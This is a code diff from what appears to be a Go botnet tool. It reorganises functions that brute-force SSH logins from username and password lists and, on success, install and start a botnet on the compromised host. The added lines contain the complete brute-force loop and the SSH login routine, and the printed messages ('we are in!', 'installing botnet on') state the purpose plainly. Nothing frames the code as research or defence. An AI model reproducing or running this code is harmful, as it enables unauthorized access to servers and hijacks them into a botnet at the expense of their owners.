@@ -63,6 +63,65 @@ func (a *Attack) Run() {
 	a.wg.Wait()
 }
 
+func (a *Attack) bruteForce(host string) {
+	defer a.wg.Done()
+
+	usernames, err := getContent(a.UsernameFile)
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+	passwords, err := getContent(a.PasswordFile)
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+	var found = false
+	c := new(credential)
+	for _, u := range usernames {
+		found = false
+		for _, p := range passwords {
+			if err := a.login(host, u, p); err != nil {
+				continue
+			}
+			c = &credential{
+				username: u,
+				password: p,
+				host:     strings.Split(host, ":")[0],
+				port:     strings.Split(host, ":")[1],
+			}
+
+			fmt.Println("[*] we are in!")
+
+			a.wg.Add(1)
+			go a.install(c)
+
+			found = true
+			break
+		}
+
+		if found {
+			break
+		}
+	}
+}
+
+func (a *Attack) login(host, username, password string) error {
+	config := &ssh.ClientConfig{
+		User: username,
+		Auth: []ssh.AuthMethod{
+			ssh.Password(password),
+		},
+	}
+
+	_, err := ssh.Dial("tcp", host, config)
+	if err != nil {
+		return err
+	}
+
+	return nil
+}
+
 func (a *Attack) install(c *credential) {
 	defer a.wg.Done()
 	fmt.Println("[*] installing botnet on", c.host)
@@ -153,70 +212,9 @@ func (a *Attack) install(c *credential) {
 	}
 }
 
-// BruteForce is
-func (a *Attack) bruteForce(host string) {
-	defer a.wg.Done()
-
-	usernames, err := getContent(a.UsernameFile)
-	if err != nil {
-		fmt.Println(err)
-		return
-	}
-	passwords, err := getContent(a.PasswordFile)
-	if err != nil {
-		fmt.Println(err)
-		return
-	}
-	var found = false
-	c := new(credential)
-	for _, u := range usernames {
-		found = false
-		for _, p := range passwords {
-			if err := a.login(host, u, p); err != nil {
-				continue
-			}
-			c = &credential{
-				username: u,
-				password: p,
-				host:     strings.Split(host, ":")[0],
-				port:     strings.Split(host, ":")[1],
-			}
-
-			fmt.Println("[*] we are in!")
-
-			a.wg.Add(1)
-			go a.install(c)
-
-			found = true
-			break
-		}
-
-		if found {
-			break
-		}
-	}
-}
-
 func (a *Attack) execute(cmd string, sess *ssh.Session) error {
 	fmt.Println("[*] starting botnet on remote machine...")
 	if err := sess.Start(cmd); err != nil {
-		return err
-	}
-
-	return nil
-}
-
-// Login is
-func (a *Attack) login(host, username, password string) error {
-	config := &ssh.ClientConfig{
-		User: username,
-		Auth: []ssh.AuthMethod{
-			ssh.Password(password),
-		},
-	}
-
-	_, err := ssh.Dial("tcp", host, config)
-	if err != nil {
 		return err
 	}
 
